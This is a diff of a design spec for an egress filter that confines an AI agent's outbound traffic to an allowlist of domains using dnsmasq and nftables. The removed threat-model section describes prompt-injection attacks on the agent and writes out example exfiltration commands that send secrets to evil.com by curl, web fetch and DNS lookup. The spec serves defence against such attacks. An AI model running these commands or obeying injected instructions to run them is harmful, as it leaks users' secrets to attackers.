@@ -1,165 +1,84 @@
-# Egress Filter
+# Spec 18: Egress Filter
 
-## Purpose
+## Motivation
 
-Restrict outbound network access from the `kitaebot` uid to a DNS-based domain allowlist. Prevents prompt-injection-driven exfiltration — a compromised agent cannot reach attacker-controlled infrastructure.
+Restrict outbound network access from the `kitaebot` uid to a DNS-based domain
+allowlist. Prevents prompt-injection-driven exfiltration — a compromised agent
+cannot reach attacker-controlled infrastructure.
 
-## Threat Model
+## Behavior
 
-Without egress filtering, a prompt injection can exfiltrate secrets via:
-
-1. **HTTP exfil** — `curl https://evil.com/?key=<secret>` (exec tool)
-2. **Tool exfil** — `web_fetch("https://evil.com/?key=...")` (web fetch tool)
-3. **DNS exfil** — `nslookup <encoded-data>.evil.com` (exec tool)
-
-All three vectors are eliminated by this spec.
-
-## Architecture
+### Architecture
 
 Two enforcement layers, each sufficient independently:
 
-```
-kitaebot uid traffic flow:
+**Layer 1 — DNS filtering (dnsmasq).** Local DNS proxy on `127.0.0.2` resolves
+only allowlisted domains. All DNS queries from the kitaebot uid are redirected
+via nftables DNAT. Unlisted domains return NXDOMAIN.
 
-  DNS query ──DNAT──► dnsmasq (127.0.0.2)
-                      ├── allowlisted domain → resolve, add IP to nft set
-                      └── unlisted domain    → NXDOMAIN
-
-  TCP connect ──► nftables output chain
-                  ├── IP in nft set, port 443 → accept
-                  └── otherwise               → drop
-```
-
-**Layer 1 — DNS filtering (dnsmasq).** Local DNS proxy resolves only allowlisted domains. All DNS queries from the kitaebot uid are redirected via nftables DNAT. Unlisted domains return NXDOMAIN immediately.
-
-**Layer 2 — IP enforcement (nftables).** Output chain matches `meta skuid 900` (static UID for the kitaebot user). Only allows TCP 443 to IPs that dnsmasq resolved and injected into an nftables set via `nftset`. Direct-IP connections (bypassing DNS) are dropped.
+**Layer 2 — IP enforcement (nftables).** Output chain matches `meta skuid 900`
+(static UID). Only allows TCP 443 to IPs that dnsmasq resolved and injected
+into nftables sets via the `nftset` directive. Direct-IP connections are
+dropped.
 
 Together: DNS prevents resolution, nftables prevents direct-IP bypass.
 
-## Default Allowlist
+### Default Allowlist
 
-| Domain                  | Purpose                       |
-|-------------------------|-------------------------------|
-| `openrouter.ai`         | LLM provider API              |
-| `api.telegram.org`      | Telegram bot channel          |
-| `github.com`            | Git clone/push, GitHub web    |
-| `api.github.com`        | GitHub REST/GraphQL API       |
-| `githubusercontent.com`  | GitHub raw content, git objects |
-| `flakehub.com`          | FlakeHub Nix registry         |
-| `api.perplexity.ai`     | Web search tool               |
+| Domain | Purpose |
+|--------|---------|
+| `openrouter.ai` | LLM provider API |
+| `api.telegram.org` | Telegram bot channel |
+| `github.com` | Git clone/push, GitHub web |
+| `api.github.com` | GitHub REST/GraphQL API |
+| `githubusercontent.com` | GitHub raw content, git objects |
+| `flakehub.com` | FlakeHub Nix registry |
+| `api.perplexity.ai` | Web search tool |
 
-dnsmasq's `server=/domain/` matches the domain and all subdomains. `server=/github.com/` covers `github.com`, `raw.github.com`, etc.
-
-## NixOS Module
-
-### New Options
-
-```nix
-kitaebot.egressAllowlist = lib.mkOption {
-  type = lib.types.listOf lib.types.str;
-  default = [
-    "openrouter.ai"
-    "api.telegram.org"
-    "github.com"
-    "api.github.com"
-    "githubusercontent.com"
-    "flakehub.com"
-    "api.perplexity.ai"
-  ];
-  description = "Domains the kitaebot process may connect to. All others blocked.";
-};
-
-kitaebot.dnsUpstream = lib.mkOption {
-  type = lib.types.str;
-  default = "9.9.9.9";
-  description = "Upstream DNS resolver for allowlisted domains (Quad9 default)";
-};
-```
+dnsmasq's `server=/domain/` matches the domain and all subdomains.
 
 ### dnsmasq Configuration
 
-Generated from `cfg.egressAllowlist` and `cfg.dnsUpstream`:
+Generated from `egressAllowlist` and `dnsUpstream`:
 
-```ini
-# Bind to loopback only (bind-dynamic allows late binding after nftables)
-listen-address=127.0.0.2
-bind-dynamic
-no-resolv
-no-poll
-
-# NXDOMAIN for all non-forwarded domains
-local=/#/
-
-# Forward allowlisted domains to upstream
-server=/openrouter.ai/9.9.9.9
-server=/api.telegram.org/9.9.9.9
-server=/github.com/9.9.9.9
-server=/api.github.com/9.9.9.9
-server=/githubusercontent.com/9.9.9.9
-server=/flakehub.com/9.9.9.9
-server=/api.perplexity.ai/9.9.9.9
-
-# Inject resolved IPs into nftables sets (IPv4 and IPv6)
-nftset=/openrouter.ai/4#inet#kitaebot-egress#allowed_v4,6#inet#kitaebot-egress#allowed_v6
-nftset=/api.telegram.org/4#inet#kitaebot-egress#allowed_v4,6#inet#kitaebot-egress#allowed_v6
-nftset=/github.com/4#inet#kitaebot-egress#allowed_v4,6#inet#kitaebot-egress#allowed_v6
-nftset=/api.github.com/4#inet#kitaebot-egress#allowed_v4,6#inet#kitaebot-egress#allowed_v6
-nftset=/githubusercontent.com/4#inet#kitaebot-egress#allowed_v4,6#inet#kitaebot-egress#allowed_v6
-nftset=/flakehub.com/4#inet#kitaebot-egress#allowed_v4,6#inet#kitaebot-egress#allowed_v6
-nftset=/api.perplexity.ai/4#inet#kitaebot-egress#allowed_v4,6#inet#kitaebot-egress#allowed_v6
-```
-
-Both `server=` and `nftset=` lines are generated by mapping over `cfg.egressAllowlist`. The `nftset` directive requires dnsmasq ≥ 2.87. `bind-dynamic` is used instead of `bind-interfaces` to allow late socket binding after nftables creates the DNAT target.
+- `listen-address=127.0.0.2`, `bind-dynamic` (allows late binding after
+  nftables)
+- `no-resolv`, `no-poll` (no external resolv.conf)
+- `local=/#/` (NXDOMAIN for all non-forwarded domains)
+- `server=/<domain>/<upstream>` per allowlisted domain
+- `nftset=/<domain>/4#inet#kitaebot-egress#allowed_v4,6#inet#kitaebot-egress#allowed_v6`
+  per domain (injects resolved IPs into nft sets)
+- `log-queries=true` (operational visibility)
+- `resolveLocalQueries = false` (prevents dnsmasq from becoming the system
+  resolver — root and nix-daemon must not be filtered)
 
 ### nftables Table
 
-Declared via `networking.nftables.tables.kitaebot-egress`:
-
 ```nft
 table inet kitaebot-egress {
-  set allowed_v4 {
-    type ipv4_addr
-    flags timeout
-    timeout 1h
-  }
-
-  set allowed_v6 {
-    type ipv6_addr
-    flags timeout
-    timeout 1h
-  }
+  set allowed_v4 { type ipv4_addr; flags timeout; timeout 1h }
+  set allowed_v6 { type ipv6_addr; flags timeout; timeout 1h }
 
   chain output {
     type filter hook output priority 0; policy accept;
-
-    # Only restrict kitaebot uid (static UID 900, avoids NSS lookup at load time)
-    meta skuid != 900 accept
-
-    # Loopback always allowed (Unix sockets, DNS proxy)
-    oifname "lo" accept
-
-    # Established connections (responses to allowed requests)
-    ct state established,related accept
-
-    # DNS to local filtering proxy only
-    meta l4proto { tcp, udp } th dport 53 ip daddr 127.0.0.2 accept
-
-    # HTTPS to IPs resolved from allowlisted domains
-    tcp dport 443 ip daddr @allowed_v4 accept
+    meta skuid != 900 accept              # only restrict kitaebot uid
+    oifname "lo" accept                   # loopback always allowed
+    ct state established,related accept   # response traffic
+    meta l4proto { tcp, udp } th dport 53 ip daddr 127.0.0.2 accept  # DNS to proxy
+    tcp dport 443 ip daddr @allowed_v4 accept   # HTTPS to resolved IPs
     tcp dport 443 ip6 daddr @allowed_v6 accept
-
-    # Everything else from kitaebot uid is dropped
-    log prefix "kitaebot-egress-drop: " counter drop
+    log prefix "kitaebot-egress-drop: " counter drop  # everything else
   }
 
   chain nat_output {
     type nat hook output priority -100; policy accept;
-
-    # Redirect kitaebot DNS queries to the filtering proxy
     meta skuid 900 meta l4proto { tcp, udp } th dport 53 dnat ip to 127.0.0.2
   }
 }
 ```
+
+The nat chain (priority -100) rewrites DNS before the filter chain (priority 0)
+evaluates the packet.
 
 ### Service Ordering
 
@@ -167,108 +86,88 @@ table inet kitaebot-egress {
 nftables.service → dnsmasq.service → kitaebot.service
 ```
 
-nft sets must exist before dnsmasq writes to them. DNS must be available before kitaebot connects.
+nft sets must exist before dnsmasq writes to them. DNS must be available before
+kitaebot connects.
 
-```nix
-systemd.services.dnsmasq = {
-  after = [ "nftables.service" ];
-  wants = [ "nftables.service" ];
-};
+### Module Options
 
-systemd.services.kitaebot = {
-  after = [ ... "dnsmasq.service" ];
-  wants = [ ... "dnsmasq.service" ];
-};
-```
+| Option | Type | Default | Description |
+|--------|------|---------|-------------|
+| `egressAllowlist` | list of str | (7 domains above) | Domains the kitaebot process may connect to |
+| `dnsUpstream` | str | `"9.9.9.9"` | Upstream DNS resolver (Quad9) |
 
-## Interaction with Existing Security Layers
+### Side Effects
 
-This spec inserts between layers 1 and 2 of the defense-in-depth stack:
+- **`web_fetch` tool**: restricted to allowlisted domains only
+- **Nix operations**: unaffected (nix daemon runs as root, not kitaebot uid).
+  If kitaebot invokes nix commands that do HTTP in-process, those would be
+  blocked. Add `cache.nixos.org` to `egressAllowlist` if needed.
+- **Git**: `github.com` and `api.github.com` are allowlisted. HTTPS
+  clone/push works. SSH git (port 22) is not allowed.
+- **Other system services**: unaffected (only uid 900 is filtered)
 
-1. VM isolation (QEMU)
-2. **Egress filter (nftables + dnsmasq)** ← this spec
-3. Unprivileged user (`kitaebot`)
-4. systemd hardening
-5. Landlock filesystem confinement
-6. Exec deny-list
-7. `PathGuard` (file tool workspace confinement)
-8. Output leak detection
+## Boundaries
 
-The existing `RestrictAddressFamilies = [AF_INET AF_INET6 AF_UNIX]` in systemd hardening complements this — raw sockets, netlink, and other families are already blocked.
+### Owns
 
-## Side Effects
+- nftables table definition (sets, chains, rules)
+- dnsmasq configuration for DNS-based filtering
+- Domain allowlist and upstream DNS config
+- Service ordering constraints
 
-- **`web_fetch` tool**: Restricted to allowlisted domains only. The agent cannot fetch arbitrary URLs. Web search via Perplexity (`api.perplexity.ai`) remains functional for general lookups.
-- **Nix operations**: Unaffected. The nix daemon runs as root, not kitaebot uid. Binary cache fetches (`cache.nixos.org`) bypass the filter entirely. Edge case: if kitaebot directly invokes nix commands that do HTTP fetches in-process (e.g., `nix flake metadata`), those would be blocked. Add `cache.nixos.org` to `egressAllowlist` if this becomes an issue.
-- **Git operations**: `github.com` and `api.github.com` are allowlisted. HTTPS clone/push works. SSH git (port 22) is not allowed — consistent with the current HTTPS-based auth design.
-- **Other system services**: Unaffected. Only traffic from uid 900 (`kitaebot`) is filtered. Root, sshd, nix-daemon, etc. have unrestricted access.
-- **Incoming firewall**: Unchanged. The existing `networking.firewall.allowedTCPPorts = [22]` controls inbound, this spec controls outbound. Orthogonal.
+### Does Not Own
+
+- The kitaebot binary — it is unaware of egress filtering
+- systemd hardening — complements `RestrictAddressFamilies` but is independent
+- VM-level networking — orthogonal to guest-level filtering
+
+## Failure Modes
+
+| Failure | Behavior |
+|---------|----------|
+| nftables fails to load | dnsmasq and kitaebot don't start (ordering dependency) |
+| dnsmasq fails to start | kitaebot doesn't start (ordering dependency) |
+| Allowlisted domain unreachable | Normal DNS/connection failure |
+| nft set entry expires (1h TTL) | Next DNS lookup re-populates the set |
+
+## Constraints
+
+- Static UID 900 required (nftables matches by numeric UID, no NSS lookup)
+- `nftset` directive requires dnsmasq >= 2.87
+- All allowlisted traffic must use HTTPS (port 443) — no other ports allowed
+- nft set entries expire after 1 hour
 
 ## Verification
 
-```bash
-# Allowed domain resolves
-sudo -u kitaebot nslookup openrouter.ai
-# → should return IP addresses
+Automated NixOS VM test in `vm/test-egress.nix` (run via
+`just test-nixos-one egress`). Two QEMU VMs on a shared VLAN:
 
-# Blocked domain returns NXDOMAIN
-sudo -u kitaebot nslookup evil.com
-# → ** server can't find evil.com: NXDOMAIN
-
-# Direct IP blocked
-sudo -u kitaebot curl -m5 https://1.2.3.4/
-# → timeout (nftables drop)
-
-# Allowed service reachable
-sudo -u kitaebot curl -m5 https://api.github.com/
-# → 200 OK (JSON response)
-
-# nft set populated after resolution
-nft list set inet kitaebot-egress allowed_v4
-# → should contain resolved IPs
-
-# Drop counter increments on blocked traffic
-nft list chain inet kitaebot-egress output | grep drop
-# → counter packets > 0
-
-# Root unaffected
-curl https://example.com
-# → 200 OK
-```
-
-## NixOS VM Test
-
-Automated integration test in `vm/test-egress.nix` (run via `just check-egress`). Two QEMU VMs on a shared VLAN:
-
-- **server** — nginx on 443 (self-signed TLS) + dnsmasq on 53 (authoritative for `api.github.com → 192.168.1.2`)
-- **kitaebot** — egress-filtering dnsmasq on `127.0.0.2` (upstream → server:53), nftables `kitaebot-egress` table
+- **server** — nginx on 443 (self-signed TLS) + dnsmasq on 53 (authoritative
+  for test domain)
+- **kitaebot** — full egress filter stack
 
 Test coverage:
 
 | Subtest | Validates |
 |---------|-----------|
 | Service ordering | nftables starts before dnsmasq |
-| Sets and chains exist | nft table structure loaded correctly |
-| Allowlisted domain resolves | dnsmasq forwards to upstream, returns IP |
-| Blocked domain NXDOMAIN | `local=/#/` returns NXDOMAIN for unlisted domains |
-| nft set populated | `nftset` directive injects resolved IP into `allowed_v4` |
-| Allowlisted HTTPS reachable | curl to resolved IP on port 443 succeeds |
-| Blocked IP dropped | curl to IP not in set fails (nftables drop) |
-| Drop counter increments | Confirms drop rule is hit |
+| Sets and chains exist | nft table structure loaded |
+| Allowlisted domain resolves | dnsmasq forwards, returns IP |
+| Blocked domain NXDOMAIN | `local=/#/` returns NXDOMAIN |
+| nft set populated | `nftset` injects resolved IP |
+| Allowlisted HTTPS reachable | curl to resolved IP succeeds |
+| Blocked IP dropped | curl to non-allowlisted IP fails |
+| Drop counter increments | Drop rule is hit |
 | Root unrestricted | Non-kitaebot uid bypasses all rules |
-
-The server runs its own dnsmasq as an authoritative upstream rather than using hosts file injection, ensuring the full resolution → nftset population → nftables accept path is exercised.
 
 ## Known Limitations
 
-1. **Shared IP ranges** — If an allowlisted domain resolves to an IP shared with a malicious service (e.g., shared CDN edge), the malicious service becomes reachable on port 443 at that IP. Unlikely to be exploitable in practice.
-2. **Set expiry** — nft set entries expire after 1 hour. If dnsmasq doesn't re-resolve before expiry, connections fail until next DNS lookup. The kitaebot process makes frequent API calls, keeping entries fresh.
-3. **No per-domain port granularity** — All allowlisted IPs share port 443. If a domain needs a non-443 port, the port list must be expanded globally.
-4. **DNS-over-HTTPS bypass** — Mitigated by nftables IP enforcement. A DoH resolver's IP won't be in the allowed set unless its domain is in the allowlist.
+1. **Shared IP ranges** — if an allowlisted domain shares a CDN IP with a
+   malicious service, that service becomes reachable on port 443
+2. **No per-domain port granularity** — all allowlisted IPs share port 443
+3. **DNS-over-HTTPS bypass** — mitigated by nftables IP enforcement (DoH
+   resolver IP won't be in the allowed set)
 
-## Future Work
+## Open Questions
 
-- **Per-domain port mapping** — `[{ domain = "github.com"; ports = [443 22]; }]` for SSH git
-- **Egress logging** — Parse nftables log prefix for anomaly detection / alerting
-- **Rate limiting** — nftables `limit` on egress bytes per second to bound exfil bandwidth even to allowlisted domains
-- **Landlock network restrictions** — Kernel 6.7+ adds Landlock network confinement. When stable in the `landlock` crate, can supplement nftables from in-process
+None currently.
